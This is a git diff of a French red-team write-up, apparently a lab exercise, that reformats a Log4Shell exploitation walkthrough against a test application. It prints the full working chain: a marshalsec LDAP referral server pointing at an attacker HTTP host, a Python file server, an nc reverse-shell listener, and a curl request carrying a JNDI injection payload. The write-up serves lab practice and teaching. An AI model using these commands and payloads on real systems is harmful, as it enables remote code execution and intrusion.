@@ -49,24 +49,40 @@ public class Exploit {
 
 **Séquence d'exploitation :**
 
-1.  **Démarrage du serveur LDAP malveillant (Terminal 1) :** Suite à l'injection, l'application vulnérable va tenter de résoudre l'adresse LDAP fournie. L'utilitaire `marshalsec` est utilisé pour instancier un serveur LDAP malveillant qui ne renvoie pas un objet direct, mais une référence JNDI. Il agit comme un routeur : il intercepte la requête de la victime et lui renvoie une directive lui ordonnant d'aller télécharger et instancier la classe Java hébergée sur le serveur HTTP de l'attaquant.
+1.  **Démarrage du serveur LDAP malveillant (Terminal 1) :**
+
     ```bash
     ~/opt/jdk8u502-b07/bin/java -cp ~/opt/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.150:8000/#Exploit"
     ```
+
+    Suite à l'injection, l'application vulnérable va tenter de résoudre l'adresse LDAP fournie. L'utilitaire `marshalsec` est utilisé pour instancier un serveur LDAP malveillant qui ne renvoie pas un objet direct, mais une référence JNDI. Il agit comme un routeur : il intercepte la requête de la victime et lui renvoie une directive lui ordonnant d'aller télécharger et instancier la classe Java hébergée sur le serveur HTTP de l'attaquant.
+
+    <br>
+
 2.  **Hébergement de la classe Java compilée (Terminal 2) :**
     ```bash
     python3 -m http.server 8000
     ```
+
+    <br>
+
 3.  **Mise en écoute du port pour le reverse shell (Terminal 3) :**
     ```bash
     nc -lvnp 4444
     ```
-4.  **Déclenchement de l'exploit (Terminal 4) :** L'envoi de la requête finale déclenche la chaîne d'exécution.
+
+    <br>
+
+4.  **Déclenchement de l'exploit (Terminal 4) :** 
     ```bash
     curl -X POST http://192.168.1.200:8443/api/login \
       -H "Content-Type: application/json" \
       -d '{"username":"${jndi:ldap://192.168.1.150:1389/a}","password":"test"}'
     ```
+
+    L'envoi de la requête finale déclenche la chaîne d'exécution.
+
+<br>
 
 ![Obtention du Reverse Shell](../images/red-team/01-nc-reverse-shell.png)
 *La connexion est établie avec succès. Le contexte d'exécution est limité aux privilèges de l'utilisateur de service `ecorp-web`.*
